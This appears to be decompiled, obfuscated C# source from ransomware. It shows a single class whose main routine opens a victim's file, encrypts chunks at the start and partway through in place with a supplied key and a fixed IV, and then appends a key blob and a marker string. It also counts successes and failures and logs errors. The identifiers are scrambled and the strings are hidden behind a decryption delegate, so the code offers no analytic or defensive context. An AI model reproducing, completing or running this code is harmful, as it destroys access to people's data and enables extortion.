using System;
using System.IO;
using System.Text;
using QzWoPVevDfmjl;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

internal sealed class HuTEHXZqnTdAJJH
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int adGAxgCeSdwR(long long_0)
	{
		return (int)long_0;
	}

	public static bool qndhJcCvTWRyk(string RBtDFBlZWMp, string giynICeKWlCl, string PTkMjYVCHyCrHzz, byte[] qkwYTsaxEzjS = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(RBtDFBlZWMp, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = adGAxgCeSdwR(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(giynICeKWlCl) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(giynICeKWlCl) * 1000 * 1000;
				}
				int zInQDRAdAFW = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = kGnEOgFfexG(RBtDFBlZWMp, fileStream, zInQDRAdAFW, num * i);
					array = (BhIlEyPUpxxiJj.iCrYnscCablx ? uhxxFRyRxKNATD.IgjqKyOilLGTDS(byte_, Encoding.ASCII.GetBytes(PTkMjYVCHyCrHzz), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RAmhBpyRiGl.unFayKpwdprxCd(byte_, Encoding.ASCII.GetBytes(PTkMjYVCHyCrHzz), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					xhrWwWjIOKaF(RBtDFBlZWMp, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (BhIlEyPUpxxiJj.KFBSzlIThq ? Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107461894)) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365333)) + Convert.ToString(giynICeKWlCl) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365333))) : Encoding.ASCII.GetBytes(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107461894)) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365310)) + Convert.ToString(giynICeKWlCl) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365310))));
			if (!BhIlEyPUpxxiJj.KFBSzlIThq)
			{
				using FileStream fileStream2 = new FileStream(RBtDFBlZWMp, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(RBtDFBlZWMp, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(qkwYTsaxEzjS, 0, qkwYTsaxEzjS.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (BhIlEyPUpxxiJj.FGwDVtbcOC)
			{
				try
				{
					File.AppendAllText(BhIlEyPUpxxiJj.INeStFPWBkZD, getString_0(107354530) + RBtDFBlZWMp + getString_0(107461913) + ex.Message + getString_0(107396504));
				}
				catch (Exception)
				{
				}
			}
			BhIlEyPUpxxiJj.TbjOxknDmA++;
			return false;
		}
		BhIlEyPUpxxiJj.TQvWczwJmWtVsb++;
		return true;
	}

	public static byte[] kGnEOgFfexG(string FzIoloGdDf, FileStream jSXooCnrqRobKIqK, int zInQDRAdAFW, int kyVLSiYvoQDk = 0)
	{
		byte[] array = new byte[zInQDRAdAFW];
		jSXooCnrqRobKIqK.Position = kyVLSiYvoQDk;
		jSXooCnrqRobKIqK.Read(array, 0, zInQDRAdAFW);
		return array;
	}

	public static void xhrWwWjIOKaF(string TwOGdSYYHyomW, FileStream mNZApULcel, byte[] dcIeiivzFQoy, int fDvoJIAODzDn = 0)
	{
		mNZApULcel.Position = fDvoJIAODzDn;
		mNZApULcel.Write(dcIeiivzFQoy, 0, dcIeiivzFQoy.Length);
	}

	static HuTEHXZqnTdAJJH()
	{
		Strings.CreateGetStringDelegate(typeof(HuTEHXZqnTdAJJH));
	}
}
